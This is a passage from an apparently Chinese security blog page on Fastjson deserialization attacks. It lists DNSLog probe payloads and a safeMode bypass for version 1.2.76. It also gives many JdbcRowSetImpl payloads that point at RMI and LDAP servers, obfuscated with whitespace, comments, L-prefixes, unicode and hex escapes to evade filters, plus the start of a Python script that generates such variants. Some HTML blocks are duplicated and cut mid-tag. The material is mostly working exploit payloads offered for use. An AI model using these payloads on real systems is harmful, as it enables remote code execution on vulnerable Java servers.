class="hljs-string">&quot;java.net.Inet4Address&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;dnslog&quot;</span>&#125;<br><br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.Inet6Address&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;dnslog&quot;</span>&#125;<br><br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.InetSocketAddress&quot;</span>&#123;<span class="hljs-string">&quot;address&quot;</span>:,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;dnslog&quot;</span>&#125;&#125;<br><br>&#123;&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.URL&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;http://dnslog&quot;</span>&#125;:<span class="hljs-string">&quot;x&quot;</span>&#125;<br><br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.alibaba.fastjson.JSONObject&quot;</span>,&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.URL&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;http://dnslog&quot;</span>&#125;&#125;<span class="hljs-string">&quot;&quot;</span>&#125;<br><br>Set[&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.URL&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;http://dnslog&quot;</span>&#125;]<br><br>Set[&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.URL&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;http://dnslog&quot;</span>&#125;<br><br>&#123;&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.URL&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;http://dnslog&quot;</span>&#125;:<span class="hljs-number">0</span><br><br><br>https:<span class="hljs-comment">//github.com/alibaba/fastjson/issues/3841</span><br>最新版 <span class="hljs-number">1.2</span><span class="hljs-number">.76</span> 开启safeMode<br>&#123;<span class="hljs-string">&quot;ss&quot;</span>:&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.alibaba.fastjson.JSONObject&quot;</span>,&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.URL&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;http://xxx.dnslog.cn&quot;</span>&#125;&#125;<span class="hljs-string">""</span>&#125;,&#125;<br></code></pre></td></tr></table></figure>





<h2 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h2><p>Fastjson默认会去除键、值外的空格、<code>\b</code>、<code>\n</code>、<code>\r</code>、<code>\f</code>等，同时还会自动将键与值进行unicode与十六进制解码</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre class=" language-hljs json">&#123;<span class="hljs-attr">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="hljs-attr">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;rmi://10.251.0.111:9999&quot;</span>,<span class="hljs-attr">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span>&#125;<br><br>&#123;  <span class="hljs-attr">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="hljs-attr">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;rmi://10.251.0.111:9999&quot;</span>,<span class="hljs-attr">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span>&#125;<br><br>&#123;<span class="hljs-comment">/*s6*/</span><span class="hljs-attr">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="hljs-attr">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;rmi://10.251.0.111:9999&quot;</span>,<span class="hljs-attr">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span>&#125;<br><br>&#123;\n<span class="hljs-attr">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="hljs-attr">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;rmi://10.251.0.111:9999&quot;</span>,<span class="hljs-attr">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span>&#125;<br><br>&#123;<span class="hljs-attr">&quot;@type&quot;</span>\b:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="hljs-attr">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;rmi://10.251.0.111:9999&quot;</span>,<span class="hljs-attr">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span>&#125;<br><br>&#123;<span class="hljs-attr">&quot;\u0040\u0074\u0079\u0070\u0065&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="hljs-attr">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;rmi://10.251.0.111:9999&quot;</span>,<span class="hljs-attr">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span>&#125;  &#123;<span class="hljs-attr">&quot;\x40\x74\x79\x70\x65&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="hljs-attr">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;rmi://10.251.0.111:9999&quot;</span>,<span class="hljs-attr">&quot;autoCommit&quot;</span>:<span class="hljs-literal"><code class="language-hljs json">&#123;<span class="hljs-attr">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="hljs-attr">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;rmi://10.251.0.111:9999&quot;</span>,<span class="hljs-attr">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span>&#125;<br><br>&#123;  <span class="hljs-attr">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="hljs-attr">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;rmi://10.251.0.111:9999&quot;</span>,<span class="hljs-attr">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span>&#125;<br><br>&#123;<span class="hljs-comment">/*s6*/</span><span class="hljs-attr">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="hljs-attr">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;rmi://10.251.0.111:9999&quot;</span>,<span class="hljs-attr">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span>&#125;<br><br>&#123;\n<span class="hljs-attr">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="hljs-attr">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;rmi://10.251.0.111:9999&quot;</span>,<span class="hljs-attr">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span>&#125;<br><br>&#123;<span class="hljs-attr">&quot;@type&quot;</span>\b:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="hljs-attr">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;rmi://10.251.0.111:9999&quot;</span>,<span class="hljs-attr">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span>&#125;<br><br>&#123;<span class="hljs-attr">&quot;\u0040\u0074\u0079\u0070\u0065&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="hljs-attr">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;rmi://10.251.0.111:9999&quot;</span>,<span class="hljs-attr">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span>&#125;  &#123;<span class="hljs-attr">&quot;\x40\x74\x79\x70\x65&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="hljs-attr">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;rmi://10.251.0.111:9999&quot;</span>,<span class="hljs-attr">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span>&#125;<br><br></code></pre></td></tr></table></figure>

<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre class=" language-hljs json">&#123;<span class="hljs-attr">&quot;rand1&quot;</span>: &#123;<span class="hljs-attr">&quot;@type&quot;</span>: <span class="hljs-string">&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;</span>, <span class="hljs-attr">&quot;dataSourceName&quot;</span>: <span class="hljs-string">&quot;ldap://localhost:1389/Object&quot;</span>, <span class="hljs-attr">&quot;autoCommit&quot;</span>: <span class="hljs-literal">true</span>&#125;&#125;<br><br>&#123;<span class="hljs-attr">&quot;rand1&quot;</span>: &#123;<span class="hljs-attr">&quot;@type&quot;</span>: <span class="hljs-string">&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;</span>, <span class="hljs-attr">&quot;dataSourceName&quot;</span>: <span class="hljs-string">&quot;ldap://localhost:1389/Object&quot;</span>, <span class="hljs-attr">&quot;autoCommit&quot;</span>: <span class="hljs-literal">true</span>&#125;&#125;<br><br>&#123;<span class="hljs-attr">&quot;rand1&quot;</span>: &#123;<span class="hljs-attr">&quot;@type&quot;</span>: <span class="hljs-string">&quot;\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c&quot;</span>, <span class="hljs-attr">&quot;dataSourceName&quot;</span>: <span class="hljs-string">&quot;ldap://localhost:1389/Object&quot;</span>, <span class="hljs-attr">&quot;autoCommit&quot;</span>: <span class="hljs-literal">true</span>&#125;&#125;<br><br>&#123;<span class="hljs-attr">&quot;rand1&quot;</span>: &#123;<span class="hljs-attr">&quot;@type&quot;</span>: <span class="hljs-string">&quot;\x63\x6f\x6d\x2e\x73\x75\x6e\x2e\x72\x6f\x77\x73\x65\x74\x2e\x4a\x64\x62\x63\x52\x6f\x77\x53\x65\x74\x49\x6d\x70\x6c&quot;</span>, <span class="hljs-attr">&quot;dataSourceName&quot;</span>: <span class="hljs-string">&quot;ldap://localhost:1389/Object&quot;</span>, <span class="hljs-attr">&quot;autoCommit&quot;</span>: <span class="hljs-literal">true</span>&#125;&#125;<br><br>&#123;<span class="hljs-attr">&quot;rand1&quot;</span>: &#123;<span class="hljs-attr">&quot;@type&quot;</span>: <span class="hljs-string">&quot;java.lang.Class&quot;</span>, <span class="hljs-attr">&quot;val&quot;</span>: <span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>&#125;, <span class="hljs-attr">&quot;rand2&quot;</span>: &#123;<span class="hljs-attr">&quot;rand1&quot;</span>: &#123;<span class="hljs-attr">&quot;@type&quot;</span>: <span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>, <span class="hljs-attr">&quot;dataSourceName&quot;</span>: <span class="hljs-string">&quot;ldap://localhost:1389/Object&quot;</span>, <span class="hljs-attr">&quot;autoCommit&quot;</span>: <span class="hljs-literal">true</span>&#125;&#125;&#125;<br><br>&#123;<span class="hljs-attr">&quot;rand1&quot;</span>: &#123;<span class="hljs-attr">&quot;@type&quot;</span>: <span class="hljs-string">&quot;\u004c\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c\u003b&quot;</span>, <span class="hljs-attr">&quot;dataSourceName&quot;</span>: <span class="hljs-string">&quot;ldap://localhost:1389/Object&quot;</span>, <span class="hljs-attr">&quot;autoCommit&quot;</span>: <span class="hljs-literal">true</span>&#125;&#125;<br><br>&#123;<span class="hljs-attr">&quot;rand1&quot;</span>: &#123;<span class="hljs-attr">&quot;@type&quot;</span>: <span class="hljs-string">&quot;\x4c\x63\x6f\x6d\x2e\x73\x75\x6e\x2e\x72\x6f\x77\x73\x65\x74\x2e\x4a\x64\x62\x63\x52\x6f\x77\x53\x65\x74\x49\x6d\x70\x6c\x3b&quot;</span>, <span class="hljs-attr">&quot;dataSourceName&quot;</span>: <span class="hljs-string">&quot;ldap://localhost:1389/Object&quot;</span>, <span class="hljs-attr">&quot;autoCommit&quot;</span>: <span class="hljs-literal">true</span>&#125;&#125;<br><br>&#123;<span class="hljs-attr">&quot;rand1&quot;</span>: &#123;<span class="hljs-attr">&quot;@type&quot;</span>: <span class="hljs-string">&quot;\u004c\u004c\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c\u003b\u003b&quot;</span>, <span class="hljs-attr">&quot;dataSourceName&quot;</span>: <span class="hljs-string">&quot;ldap://localhost:1389/Object&quot;</span>, <span class="hljs-attr">&quot;autoCommit&quot;</span>: <span class="hljs-literal">true</span>&#125;&#125;<br><br>&#123;<span class="hljs-attr">&quot;rand1&quot;</span>: &#123;<span class="hljs-attr">&quot;@type&quot;</span>: <span class="hljs-string">&quot;\x4c\x4c\x63\x6f\x6d\x2e\x73\x75\x6e\x2e\x72\x6f\x77\x73\x65\x74\x2e\x4a\x64\x62\x63\x52\x6f\x77\x53\x65\x74\x49\x6d\x70\x6c\x3b\x3b&quot;</span>, <span class="hljs-attr">&quot;dataSourceName&quot;</span>: <span class="hljs-string">&quot;ldap://localhost:1389/Object&quot;</span>, <span class="hljs-attr">&quot;autoCommit&quot;</span>: <span class="hljs-literal">true</span>&#125;&#125;<br><br>&#123;<span class="hljs-attr">&quot;rand1&quot;</span>: &#123;<span class="hljs-attr">&quot;@type&quot;</span>: <span class="hljs-string">&quot;\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0043\u006c\u0061\u0073\u0073&quot;</span>, <span class="hljs-attr">&quot;val&quot;</span>: <span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>&#125;, <span class="hljs-attr">&quot;rand2&quot;</span>: &#123;<span class="hljs-attr">&quot;rand1&quot;</span>: &#123;<span class="hljs-attr">&quot;@type&quot;</span>: <span class="hljs-string">&quot;\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c&quot;</span>, <span class="hljs-attr">&quot;dataSourceName&quot;</span>: <span class="hljs-string">&quot;ldap://localhost:1389/Object&quot;</span>, <span class="hljs-attr">&quot;autoCommit&quot;</span>: <span class="hljs-literal">true</span>&#125;&#125;&#125;<br><br>&#123;<span class="hljs-attr">&quot;rand1&quot;</span>: &#123;<span class="hljs-attr">&quot;@type&quot;</span>: <span class="hljs-string">&quot;\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x43\x6c\x61\x73\x73&quot;</span>, <span class="hljs-attr">&quot;val&quot;</span>: <span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>&#125;, <span class="hljs-attr">&quot;rand2&quot;</span>: &#123;<span class="hljs-attr">&quot;rand1&quot;</span>: &#123;<span class="hljs-attr">&quot;@type&quot;</span>: <span class="hljs-string">&quot;\x63\x6f\x6d\x2e\x73\x75\x6e\x2e\x72\x6f\x77\x73\x65\x74\x2e\x4a\x64\x62\x63\x52\x6f\x77\x53\x65\x74\x49\x6d\x70\x6c&quot;</span>, <span class="hljs-attr">&quot;dataSourceName&quot;</span>: <span class="hljs-string">&quot;ldap://localhost:1389/Object&quot;</span>, <span class="hljs-attr">&quot;autoCommit&quot;</span>: <span class="hljs-literal"><code class="language-hljs json">&#123;<span class="hljs-attr">&quot;rand1&quot;</span>: &#123;<span class="hljs-attr">&quot;@type&quot;</span>: <span class="hljs-string">&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;</span>, <span class="hljs-attr">&quot;dataSourceName&quot;</span>: <span class="hljs-string">&quot;ldap://localhost:1389/Object&quot;</span>, <span class="hljs-attr">&quot;autoCommit&quot;</span>: <span class="hljs-literal">true</span>&#125;&#125;<br><br>&#123;<span class="hljs-attr">&quot;rand1&quot;</span>: &#123;<span class="hljs-attr">&quot;@type&quot;</span>: <span class="hljs-string">&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;</span>, <span class="hljs-attr">&quot;dataSourceName&quot;</span>: <span class="hljs-string">&quot;ldap://localhost:1389/Object&quot;</span>, <span class="hljs-attr">&quot;autoCommit&quot;</span>: <span class="hljs-literal">true</span>&#125;&#125;<br><br>&#123;<span class="hljs-attr">&quot;rand1&quot;</span>: &#123;<span class="hljs-attr">&quot;@type&quot;</span>: <span class="hljs-string">&quot;\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c&quot;</span>, <span class="hljs-attr">&quot;dataSourceName&quot;</span>: <span class="hljs-string">&quot;ldap://localhost:1389/Object&quot;</span>, <span class="hljs-attr">&quot;autoCommit&quot;</span>: <span class="hljs-literal">true</span>&#125;&#125;<br><br>&#123;<span class="hljs-attr">&quot;rand1&quot;</span>: &#123;<span class="hljs-attr">&quot;@type&quot;</span>: <span class="hljs-string">&quot;\x63\x6f\x6d\x2e\x73\x75\x6e\x2e\x72\x6f\x77\x73\x65\x74\x2e\x4a\x64\x62\x63\x52\x6f\x77\x53\x65\x74\x49\x6d\x70\x6c&quot;</span>, <span class="hljs-attr">&quot;dataSourceName&quot;</span>: <span class="hljs-string">&quot;ldap://localhost:1389/Object&quot;</span>, <span class="hljs-attr">&quot;autoCommit&quot;</span>: <span class="hljs-literal">true</span>&#125;&#125;<br><br>&#123;<span class="hljs-attr">&quot;rand1&quot;</span>: &#123;<span class="hljs-attr">&quot;@type&quot;</span>: <span class="hljs-string">&quot;java.lang.Class&quot;</span>, <span class="hljs-attr">&quot;val&quot;</span>: <span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>&#125;, <span class="hljs-attr">&quot;rand2&quot;</span>: &#123;<span class="hljs-attr">&quot;rand1&quot;</span>: &#123;<span class="hljs-attr">&quot;@type&quot;</span>: <span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>, <span class="hljs-attr">&quot;dataSourceName&quot;</span>: <span class="hljs-string">&quot;ldap://localhost:1389/Object&quot;</span>, <span class="hljs-attr">&quot;autoCommit&quot;</span>: <span class="hljs-literal">true</span>&#125;&#125;&#125;<br><br>&#123;<span class="hljs-attr">&quot;rand1&quot;</span>: &#123;<span class="hljs-attr">&quot;@type&quot;</span>: <span class="hljs-string">&quot;\u004c\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c\u003b&quot;</span>, <span class="hljs-attr">&quot;dataSourceName&quot;</span>: <span class="hljs-string">&quot;ldap://localhost:1389/Object&quot;</span>, <span class="hljs-attr">&quot;autoCommit&quot;</span>: <span class="hljs-literal">true</span>&#125;&#125;<br><br>&#123;<span class="hljs-attr">&quot;rand1&quot;</span>: &#123;<span class="hljs-attr">&quot;@type&quot;</span>: <span class="hljs-string">&quot;\x4c\x63\x6f\x6d\x2e\x73\x75\x6e\x2e\x72\x6f\x77\x73\x65\x74\x2e\x4a\x64\x62\x63\x52\x6f\x77\x53\x65\x74\x49\x6d\x70\x6c\x3b&quot;</span>, <span class="hljs-attr">&quot;dataSourceName&quot;</span>: <span class="hljs-string">&quot;ldap://localhost:1389/Object&quot;</span>, <span class="hljs-attr">&quot;autoCommit&quot;</span>: <span class="hljs-literal">true</span>&#125;&#125;<br><br>&#123;<span class="hljs-attr">&quot;rand1&quot;</span>: &#123;<span class="hljs-attr">&quot;@type&quot;</span>: <span class="hljs-string">&quot;\u004c\u004c\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c\u003b\u003b&quot;</span>, <span class="hljs-attr">&quot;dataSourceName&quot;</span>: <span class="hljs-string">&quot;ldap://localhost:1389/Object&quot;</span>, <span class="hljs-attr">&quot;autoCommit&quot;</span>: <span class="hljs-literal">true</span>&#125;&#125;<br><br>&#123;<span class="hljs-attr">&quot;rand1&quot;</span>: &#123;<span class="hljs-attr">&quot;@type&quot;</span>: <span class="hljs-string">&quot;\x4c\x4c\x63\x6f\x6d\x2e\x73\x75\x6e\x2e\x72\x6f\x77\x73\x65\x74\x2e\x4a\x64\x62\x63\x52\x6f\x77\x53\x65\x74\x49\x6d\x70\x6c\x3b\x3b&quot;</span>, <span class="hljs-attr">&quot;dataSourceName&quot;</span>: <span class="hljs-string">&quot;ldap://localhost:1389/Object&quot;</span>, <span class="hljs-attr">&quot;autoCommit&quot;</span>: <span class="hljs-literal">true</span>&#125;&#125;<br><br>&#123;<span class="hljs-attr">&quot;rand1&quot;</span>: &#123;<span class="hljs-attr">&quot;@type&quot;</span>: <span class="hljs-string">&quot;\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0043\u006c\u0061\u0073\u0073&quot;</span>, <span class="hljs-attr">&quot;val&quot;</span>: <span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>&#125;, <span class="hljs-attr">&quot;rand2&quot;</span>: &#123;<span class="hljs-attr">&quot;rand1&quot;</span>: &#123;<span class="hljs-attr">&quot;@type&quot;</span>: <span class="hljs-string">&quot;\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c&quot;</span>, <span class="hljs-attr">&quot;dataSourceName&quot;</span>: <span class="hljs-string">&quot;ldap://localhost:1389/Object&quot;</span>, <span class="hljs-attr">&quot;autoCommit&quot;</span>: <span class="hljs-literal">true</span>&#125;&#125;&#125;<br><br>&#123;<span class="hljs-attr">&quot;rand1&quot;</span>: &#123;<span class="hljs-attr">&quot;@type&quot;</span>: <span class="hljs-string">&quot;\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x43\x6c\x61\x73\x73&quot;</span>, <span class="hljs-attr">&quot;val&quot;</span>: <span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>&#125;, <span class="hljs-attr">&quot;rand2&quot;</span>: &#123;<span class="hljs-attr">&quot;rand1&quot;</span>: &#123;<span class="hljs-attr">&quot;@type&quot;</span>: <span class="hljs-string">&quot;\x63\x6f\x6d\x2e\x73\x75\x6e\x2e\x72\x6f\x77\x73\x65\x74\x2e\x4a\x64\x62\x63\x52\x6f\x77\x53\x65\x74\x49\x6d\x70\x6c&quot;</span>, <span class="hljs-attr">&quot;dataSourceName&quot;</span>: <span class="hljs-string">&quot;ldap://localhost:1389/Object&quot;</span>, <span class="hljs-attr">&quot;autoCommit&quot;</span>: <span class="hljs-literal">true</span>&#125;&#125;&#125;<br></code></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/1192/#fastjson">脚本将payload转换十六进制、unicode</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre class=" language-hljs python"><span class="hljs-comment">#!usr/bin/env python  </span><br><span class="hljs-comment"># -*- coding:utf-8 -*-</span><br><span class="hljs-string">&quot;&quot;&quot; </span><br><span class="hljs-string">@author: longofo</span><br><span class="hljs-string">@file: fastjson_fuzz.py </span><br><span class="hljs-string">@time: 2020/05/07 </span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">from</span> json <span class="hljs-keyword">import</span> JSONDecodeError<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FastJsonPayload</span>:</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, base_payload</span>):</span><br>        <span class="hljs-keyword">try</span>:<br>            json.loads(base_payload)<br>        <span class="hljs-keyword">except</span> JSONDecodeError <span class="hljs-keyword">as</span> ex:<br>            <span class="hljs-keyword">raise</span> ex<br>        self.base_payload = base_payload<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">gen_common</span>(<span class="hljs-params">self, payload, func</span>):</span><br>        tmp_payload = json.loads(payload)<br>        dct_objs = [tmp_payload]<br><br>        <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(dct_objs) &gt; <span class="hljs-number">0</span>:<br>            tmp_objs = []<br>            <span class="hljs-keyword">for</span> dct_obj <span class="hljs-keyword">in</span> dct_objs:<br>                <span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> dct_obj:<br>                    <span class="hljs-keyword">if</span> key == <span class="hljs-string">&quot;@type&quot;</span>:<br>                        dct_obj[key] = func(dct_obj[key])<br><br>                    <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(dct_obj[key]) == <span class="hljs-built_in">dict</span>:<br>                        tmp_objs.append(dct_obj[key])<br>            dct_objs = tmp_objs<br>        <span class="hljs-keyword">return</span> json.dumps(tmp_payload)<br><br>    <span class="hljs-comment"># 对@type的value增加L开头，;结尾的payload</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">gen_payload1</span>(<span class="hljs-params">self, payload: <span class="hljs-built_in">str</span></span>):</span><br>        <span class="hljs-keyword">return</span> self.gen_common(payload, <span class="hljs-keyword">lambda</span> v: <span class="hljs-string">&quot;L&quot;</span> + v + <span class="hljs-string">&quot;;&quot;</span>)<br><br>    <span class="hljs-comment"># 对@type的value增加LL开头，;;结尾的payload</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">gen_payload2</span>(<span class="hljs-params">self, payload: 